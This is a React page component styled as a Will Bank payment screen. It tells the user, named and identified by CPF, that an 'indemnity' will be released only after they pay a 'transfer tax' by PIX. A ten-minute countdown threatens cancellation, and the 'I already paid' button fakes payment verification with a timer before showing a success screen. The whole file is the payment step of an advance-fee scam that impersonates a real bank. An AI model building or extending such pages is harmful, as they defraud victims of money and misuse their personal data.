import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { 
  CheckCircle, 
  Copy, 
  Clock,
  QrCode,
  Loader2
} from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import { CPFData } from "@/lib/cpf";
import { toast } from "@/hooks/use-toast";
import willbankLogo from "@/assets/willbank-logo.png";

const Saque = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);
  const [countdown, setCountdown] = useState(600); // 10 minutes

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;
  const valorTaxa: number | undefined = location.state?.valorTaxa;
  const protocolo: string | undefined = location.state?.protocolo;

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Countdown timer
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [cpfData, valorBeneficio, navigate]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopiarPix = () => {
    const pixCode = "00020126580014br.gov.bcb.pix0136example-pix-key-here5204000053039865802BR5925WILL BANK PAGAMENTOS6009SAO PAULO62070503***6304ABCD";
    navigator.clipboard.writeText(pixCode);
    toast({
      title: "Código PIX copiado! ✓",
      description: "Cole o código no seu aplicativo bancário",
    });
  };

  const handleConfirmarPagamento = () => {
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setIsCompleted(true);
      toast({
        title: "Pagamento confirmado!",
        description: "Sua indenização será processada em breve",
      });
    }, 3000);
  };

  if (!cpfData || !valorBeneficio) return null;

  const taxaFinal = valorTaxa || (valorBeneficio * 0.0071);

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
        breadcrumb="Benefício > Indenização > Pagamento"
      />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          {!isCompleted ? (
            <div className="space-y-6">
              {/* Header */}
              <div className="text-center space-y-2">
                <img src={willbankLogo} alt="Will Bank" className="h-10 mx-auto" />
                <h1 className="text-xl font-bold">Pagamento do Imposto de Transferência</h1>
              </div>

              {/* Countdown */}
              <div className="bg-red-50 border border-red-200 rounded-xl p-4 text-center">
                <div className="flex items-center justify-center gap-2 text-red-600">
                  <Clock className="w-5 h-5" />
                  <span className="font-medium">Tempo restante para pagamento:</span>
                </div>
                <p className="text-3xl font-bold text-red-600 font-mono mt-2">{formatTime(countdown)}</p>
                <p className="text-xs text-red-500 mt-1">Após este prazo, sua indenização será cancelada</p>
              </div>

              {/* Values Summary */}
              <div className="bg-muted rounded-xl p-4 space-y-3">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Indenização a receber:</span>
                  <span className="font-bold text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between border-t pt-3">
                  <span className="text-muted-foreground">Imposto a pagar:</span>
                  <span className="font-bold text-primary">R$ {taxaFinal.toFixed(2).replace('.', ',')}</span>
                </div>
                {protocolo && (
                  <div className="flex justify-between border-t pt-3">
                    <span className="text-muted-foreground">Protocolo:</span>
                    <span className="font-mono text-sm">{protocolo}</span>
                  </div>
                )}
              </div>

              {/* QR Code */}
              <div className="text-center space-y-4">
                <p className="text-sm text-muted-foreground">Escaneie o QR Code ou copie o código PIX:</p>
                
                <div className="w-48 h-48 mx-auto bg-white rounded-xl border-2 border-primary p-2">
                  <div className="w-full h-full bg-gray-100 rounded-lg flex items-center justify-center">
                    <QrCode className="w-32 h-32 text-foreground" />
                  </div>
                </div>

                <Button
                  variant="outline"
                  onClick={handleCopiarPix}
                  className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full"
                >
                  <Copy className="w-4 h-4 mr-2" />
                  Copiar código PIX
                </Button>
              </div>

              {/* Confirm Button */}
              <Button 
                onClick={handleConfirmarPagamento}
                disabled={isProcessing}
                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
              >
                {isProcessing ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin mr-2" />
                    Verificando pagamento...
                  </>
                ) : (
                  "Já paguei, liberar minha indenização"
                )}
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                Após a confirmação do pagamento, sua indenização será liberada em até 24h úteis.
              </p>
            </div>
          ) : (
            /* Success State */
            <div className="text-center space-y-6 py-8 animate-scale-in">
              <div className="w-24 h-24 mx-auto bg-green-100 rounded-full flex items-center justify-center">
                <CheckCircle className="w-16 h-16 text-green-500" />
              </div>
              
              <div className="space-y-2">
                <h1 className="text-2xl font-bold">Pagamento Confirmado!</h1>
                <p className="text-muted-foreground">
                  Sua indenização está sendo processada.
                </p>
              </div>

              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-3 text-left">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Beneficiário:</span>
                  <span className="font-medium">{cpfData.nome}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">CPF:</span>
                  <span className="font-medium">{cpfData.cpf}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Valor:</span>
                  <span className="font-bold text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Previsão:</span>
                  <span className="font-medium">Até 24h úteis</span>
                </div>
              </div>

              <Button 
                onClick={() => navigate("/")}
                variant="outline"
                className="w-full h-12 rounded-full"
              >
                Voltar ao início
              </Button>
            </div>
          )}
        </WillBankCard>
      </main>
    </div>
  );
};

export default Saque;
